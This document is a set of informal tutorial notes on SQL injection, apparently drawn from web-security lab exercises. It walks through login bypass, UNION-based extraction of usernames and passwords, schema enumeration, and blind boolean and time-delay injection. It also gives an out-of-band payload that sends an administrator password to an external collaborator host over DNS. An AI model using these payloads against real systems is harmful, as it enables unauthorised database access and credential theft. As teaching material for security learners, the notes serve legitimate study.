SQLI(SQL Injection)

In this one of the most important symbol is '--'' ( comment sign)

Defition: It is the kind of vulnerability where the attacker(us)makes a type of request to the database in such a way that one can even see the data which can't be seen easily(i.e that is hidden)

There are many versions of SQli...some of them are

#RETRIEVING HIDDEN DATA


this kind of SQLI is used to show the data which is hidden from public view.

For example: suppose there is a website which shows the product and you visit a particular type...for ex:
for this the URL would be

http://example.com/items?=toys&view=1

so what happens here is the backend is parsing the data as

Select * from tabe where items='toys' and view='1' ( here consider view=1 as kind of and indicator which shows if the item can be viewed or not)

So if we cant to view the other content,which cant  be seen, here ( view=0)
so we need to make a query 

http://example.com/items?=toys'--&view=1

which will be parsed as

Select * from table where items='toys'--' and view='1'...So what it does here; is '--' comments out the "AND VIEW=1" part which lets the super cool attacker see all the toys which were not available before for general people to see


#BYPASSING THE APPLICATION LOGIC

Everyone has seen a login portal right?
You enter an ID and a passwords,if it's correct you can login,but if it's not you get an error..
But in the backend part of this login portal...There is always a query like

"Select * from table where username='name' and password='password'"

You can see where it's going from here...different sites use different methods to retrieve the data from the databse table...some are secure and some are not...but it's basically the same...So to use SQLI in login forms we use something like

'OR 1=1-- or something along the line depending on the situation at hand...

A basic example would be 

username: admin'--
password: ''

Which will make make the query as

Select * from TABLE where username = 'admin'--' and password=''

here the '--' comments out the password which enables the attacker to successfully gain access.

Nowadays sites properly parse the input which makes it very difficult to get log-in through SQLI,so to get information from the database we sometimes have to use certain different methods.Which we will see in the upcoming topic


#FETCHING DATA FROM OTHER TABLES

Let's take the example from the site item shop site,which we took before

http://example.com/items?=toys&view=1

suppose now we want to see all the items,not just toys.
Before we proceed further let's look into what we know already

1.We have to use the  '--' sign to comment out the rest of the query
2.We need to think of a logic which when used inside a query will give all the "True" result. (Here "TRUE" refers to if the server thinks that the query can be returned with the input data)

So let's construct the payload

http://example.com/items?=toys'OR 1=1--&view=1

Here the query is being parsed as 

Select * from table where items='toys'OR 1=1--' and view='1' .
This roughly reads as select everything where items is either 'toys' OR 'True' (AS 1=1 which will always be true)


#GETTING OTHER DATA WHEN SQLI IS SUCCESFULL


These types of SQLI can be possible if the response of SQLI shows the data from the database...for this the primary keyword here is "UNION" which makes it possible to use two select statements in a single query.
Let's take an example..

select toys from store UNION select gifts from items ( here store and items are different tables)

BUT... for it to be successfull..certain condtions have to be met.

1.The number of columns returned should be the same.(We will see later on how to find that)
2.The data type must be compatible in the two queries (Ex: if you try to get a int and a string..it won't work)

+++++++++++ UNION SQLI ATTACKS ++++++++++++++

Step 1: First we need to find the number of columns in the given database..we need to determine this so that we can then use 'union select to find out the information from the table

'ORDER BY 1--
'ORDER BY 2-- 

and so on(you could autoamte this too)...till we need get an error or a different kind of response from the server


Step 2: After finding out the number of columns we need to determine the data type of the particular column,to find this we use 'NULL' value...It's used since NULL doesn't have a specific data type it has a a great chance of getting successfull.

'UNION SELECT NULL,NULL -- (for two columns)

Step 3: If everything works in your favour till now,we could then determine the data types of the columns which we want to retrieve,Suppose we want to retrieve the 'passwords' which is os STRING data types,so we use something like

'UNION SELECT 'password',NULL,NULL-- 

we use this hit and trial till we get the desired results...
and suppose there is a table named 'users' ( SQL tables in a databse can be found out using certain methods which will be discussed later on)

so the query changes to 

'UNION SELECT 'password',NULL,NULL FROM users--
 We could use this to get more data from the table...but to things more clear and readable we use the '||' operator(concatenate),which enables an attacker to display data from two different column in a single column

 Ex 'UNION SELECT username||'='||password FROM users --

 which will display result like

 admin=admin
 john=hello123
 carlos=rockyou12!



#EXAMINING THE DATABASES

For attackers it's necessary to have the information of the system they are attacking...for the SQLI that basically sums to the version of the database and the tables in the database.

Primarily 3 types of databases are used.

DATABASE                          BASIC SYNTAX 
--------                         --------------
MySQL                           Select @@version
Oracle                          Select * from v$version
PostgreSQL 	                    Select version()

The steps are same to find the version,find the number of columns,find the datatype in the column,find the version

++ Enumerating the databases ++

Before trying to use specific SQLI for the data,we need to find certain the tables in a particular database.

all other databaes

The first step to finding information is finding the number of number of columns,and data type and then finding the information of the table.

 information_schema.tables  table_name

 General Syntax: 'Union Select table_name,null from information_schema.tables-- (considering there are two columns)

 infromation_schema.columns  column_name

 General Syntax: 'Union select column_name,null from information_schema.cloumns where table_name='XYZ'--

 this shows the information of all the columns present in the particular table,we could then select the columns that we want to show

ORACLE DATABASE

the steps are the same for oracle database.

 all_tables
 all_tab_columns



#BLIND SQL INJECTION


the SQLI that we have been performing till now involved showing the error response on the page,but what if the web page doesn't show any response?

That's where Blind SQLI comes,in gist we try to provide with either false input and then correct input in a loop,till we get a successfull or a valid error,other way is to introduce a time delay,so for succesfull hit there will be a time delay in the page and for a false hit the page would load instantly,the scope of blind SQLI is so large that it's nearly impossible to cover in theory... but we will be covering few of them for a basic understanding.


++++++++ EXPLOITING BLIND SQLI BY TRIGGERING SERVER RESPONSE ++++++++++++



We have a login page having


username=________
password=________


trying the 'OR 1=1# gives us 'Invalid password' response,this means that username is true and the form is vulnerable to SQLI (we could find this through lot many other ways too)

we capture the request and send it to burp intruder


there,we edit the following line

username=$x$&password=$y$
we use the intruder the loop the username's x value to find a valid response,
we check the databse first for the length of the database's name

username=' or LENGTH(database())=$x$#&password=y (suppose we get a true response on length =6)

LENGTH() is an SQL function to find the length of the param passed inside it
database() is an sql fucntion for the database name..

we use the $x$ to loop the numbers for 1 to a given particular length,and check each response indivudally,if we hit a true value the error response changes.

After finding the length,we need to find out the name of the database so as to create a tailored SQLi

username=' or database() LIKE '$_$$_$$_$$_$$_$$_$'#&password=y

LIKE is an SQL keyword which is used to match the data provided with the data in the table,
for eg: SELECT * FROM USERS LIKE 'm%' returns all the value in the USER table where the starting letter is 'm'

we use  the intruder to iterate through all the responses,here we use the chars list as payload.
after checking manually through the error response we note down all the true hits.

here we get 
1=l
2=e
3=v
4=e
5=l
6=2

we found out the database is level2 and now from here onwards we could use the same method to find out the number of tables in the database and much more,but the basic is the same.we could also trigger error response by using CASE keyword in the SQL and specifying conditions like '1/0' which may also be an indicator to get the response we want.


++++++++ EXPLOITING BLIND SQLI BY TRIGGERING TIME DELAY ++++++++++++


There are times where despite using normal SQLI or triggering error responses by Blind SQLI doesn't work,in that case the attacker can use TIME DELAY to trigger a response whether the used particular condition is either true or false...

Consider the same previous case...

we can use something like

'1-IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0)


Here the code is checking for the version of the database,if it's true then the server will delay the response by 15sec which will let the attacker know that it's true,and they can use the intruder to iterate through each and every character till they get the information they want.The syntax for time delay varies from databse to database

DATABASE              FUCNTION
---------             --------

MYSQL                'SLEEP()'
SQL SERVER           'WAIT FOR DELAY HH:MM:SS'
ORACLE                'SLEEP()' ,                 

(but it's literally very hard to use sleep in oracle,as one needs to first find the SQLI vulnerability in the PL/SQL code,so it's better to use a heavy query before introducing a SLEEp() in the oracle Database)



++++++++ EXPLOITING BLIND SQLI BY using Out of Band Techniques(OAST)++++++++++++


Suppose a severs queires the input asynchronously,i.e it processes the input on two different threads(in simple words thread can be considered as a path).The application continues processing the user's request in the original thread, and uses another thread to execute an SQL query,so for this the attackers can use out-of-band network interactions to a system.Usually the server allows DNS queries to flow freely as they are important to carry out the operations,so the attacker can use it to gain SQLI

These are hard to use,as different databases use different queries.


For Microsoft SQL server we could use something like this

'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'-- 

this will cause the server to look for 0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net which can then be used similarly to all the previous blind SQLI techniques. 

Suppose there is an users table,so a query can be used like this to find the admin password


'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')-- 

Here 'declare' is used to specify a variable p of type character,which is then assigned a value from the given SQL query(which is the password from administrator). The server tries to look for the cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net which allows the attacker SQL query to be runned together with the DNS query.


Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work. 



NOTE: SQLI is a process which takes lots of creativity and knowledge regarding the syntax of the DBMS,it's also pretty much time consuming...so to autoamte these processes we have certains tools like 'sqlmap' which makes it easier for an attacker to get the data from a dbms,but to use it one must have a knowdlege of how SQLI works.





















